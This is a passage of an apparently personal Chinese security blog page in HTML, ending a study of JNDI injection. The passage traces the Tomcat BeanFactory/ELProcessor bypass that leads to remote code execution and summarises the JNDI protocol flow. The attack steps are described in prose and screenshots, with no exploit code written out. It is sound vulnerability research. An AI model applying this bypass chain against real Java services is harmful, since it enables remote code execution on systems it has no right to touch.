src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123958654-cf11d07c-0195-4b8b-b3cb-9706ffc013a2.png#averageHue=%234a4f53&clientId=u4c4ac00c-9379-4&from=paste&height=287&id=vkGR9&originHeight=431&originWidth=1692&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=399222&status=done&style=none&taskId=ud2d50bf2-a848-4ed5-b17c-d14a82dcaaa&title=&width=1128" referrerpolicy="no-referrer" alt="image.png"><br>自然跟进到<code>BeanFactory</code>的<code>getObjectInstance</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710124082446-e7541c0f-8e1f-42d7-9126-445159425e19.png#averageHue=%233b4248&clientId=u4c4ac00c-9379-4&from=paste&height=445&id=p3lBe&originHeight=667&originWidth=2119&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=516891&status=done&style=none&taskId=u890d45f5-49c3-479e-9b08-0d55eb1bb7a&title=&width=1412.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>调用<code>ResourceRef.getClassName()</code>，获取到 ELProcessor 的全类名，开一个当前线程的 context 类加载器，对 ELProcessor 进行类加载<br>然后的内容就是对 ResourceRef 这个类中的设定的信息进行处理，比如说获取到 forceString，然后对其字符串处理满足表达式，然后获取要执行方法的参数等等，最后的最后，获取到方法以及参数之后反射调用，触发 RCE<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710124344767-b20c574c-e2a6-4887-b2e0-00ab58c18946.png#averageHue=%233b4146&clientId=u4c4ac00c-9379-4&from=paste&height=520&id=Q5ss2&originHeight=780&originWidth=2091&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=597147&status=done&style=none&taskId=uc5c5f773-1e83-4ce4-ba90-78d311f0877&title=&width=1394" referrerpolicy="no-referrer" alt="image.png"><br>最终触发如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710124432777-c96210d7-a9c7-44eb-9ff5-4c9f6f2035ef.png#averageHue=%233e4141&clientId=u4c4ac00c-9379-4&from=paste&height=569&id=w8MZ1&originHeight=854&originWidth=2331&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=599369&status=done&style=none&taskId=uc81daa45-0d40-4fad-9365-0634c71e09d&title=&width=1554" referrerpolicy="no-referrer" alt="image.png"><br>EL 表达式其实是一种很常用的 RCE 媒介，初次完整分析很过瘾</p>
+<p>JNDI 复习 over，除了思路开拓和基础部分是跟文章，分析部分都是自己去走逻辑，去解决自己遇到的问题，感觉很爽，不会再去傻傻的跟着别人的步骤走了</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>稍微总结一下<br>JNDI 的工作流程，不论是不是动态协议转化，都是一个总的逻辑：为了获取到 context 实例而去构造 factory 工厂类，然后通过 factory 去实例化 context，然后再去通过 context 去调用各种方法<br>如果是指定 initialcontext 的属性，调用 initialcontext 的各种功能方法，那么逻辑大致为<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964014420-cec5e139-283d-4569-bee8-4a21b2d0ad57.png?x-oss-process=image/format,webp#averageHue=%23555555&from=url&id=LTJYt&originHeight=126&originWidth=880&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=" referrerpolicy="no-referrer"><br>如果是动态协议转化（漏洞所在）<br>initialContext 直接调方法，比如 lookup，那么他会先判断是哪种协议，然后通过获取该协议相关的 factory，去构造该协议的 Context，再去调该协议 Context 的方法，我们的漏洞分析也就是从这里开始的</p>
+<ul>
+<li>getURLOrDefaultInitCtx 获取到相关协议 Context</li>
+<li>相关协议 context 调用相关方法，如 lookup</li>
+<li>通过 RMI 原生获取到远程服务器上的恶意字节码</li>
+<li>decodeObject 开始实例化，本质还是通过工厂类去实例化</li>
+<li>调用工厂类的getObjectInstance 去完成（高版本与低版本的区别就在此是否有对类型的限制，以及trustURLCodebase 默认是否为 false）</li>
+</ul>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-08-09 18:24:16
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/JNDI/" title="JNDI">
+                        #JNDI
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/post/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-JNDI"><span class="toc-text">什么是 JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Naming-%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1"><span class="toc-text">0x01 Naming 命名服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Directory-%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-text">0x02 Directory 目录服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JNDI-SPI"><span class="toc-text">0x03 JNDI SPI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">JNDI 代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-JNDI-RMI-%E5%AE%9E%E7%8E%B0"><span class="toc-text">0x01 JNDI_RMI 实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">JNDI 工作流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-context-%E5%88%9D%E5%A7%8B%E5%8C%96%E5%92%8C%E5%AF%B9%E5%BA%94%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE"><span class="toc-text">0x01 context 初始化和对应属性设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JNDI-%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0"><span class="toc-text">0x02 JNDI 底层实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E8%8E%B7%E5%8F%96-contect-%E7%9A%84-factor-%E6%9E%84%E9%80%A0%E7%B1%BB"><span class="toc-text">1x01 获取 contect 的 factor 构造类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x02-%E8%8E%B7%E5%8F%96-context-%E5%86%85%E5%AE%B9"><span class="toc-text">1x02 获取 context 内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8C%96"><span class="toc-text">JNDI 动态协议转化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">0x01 动态协议转化流程分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-Refernce-%E7%B1%BB"><span class="toc-text">JNDI-Refernce 类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-%E6%B3%A8%E5%85%A5"><span class="toc-text">JNDI 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-JNDI-RMI"><span class="toc-text">0x01 JNDI+RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">1x01 流程分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%B8%A9%E5%9D%91%E5%AE%9E%E5%BD%95"><span class="toc-text">0x02 踩坑实录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JNDI-LDAP"><span class="toc-text">0x03 JNDI+LDAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AF-LDAP"><span class="toc-text">0x01 什么是 LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-JNDI-LDAP-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-text">0x02 JNDI+LDAP 攻击实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1x01-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">1x01 攻击流程分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-text">JNDI 注入高版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-JNDI-RMI-%E9%99%90%E5%88%B6"><span class="toc-text">0x01 JNDI-RMI 限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">1x01 源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-JNDI-LDAP-%E9%99%90%E5%88%B6"><span class="toc-text">0x02 JNDI-LDAP 限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%BB%95%E8%BF%87%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90"><span class="toc-text">0x03 绕过实现分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1x03-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">1x03 代码实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1x04-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">1x04 流程分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: [''],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2024 Oranges
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        Theme by Oranges | Powered by Hexo
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + JNDI%E9%87%8D%E7%9C%8B + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2FJNDIRe0.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/JNDIRe0.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
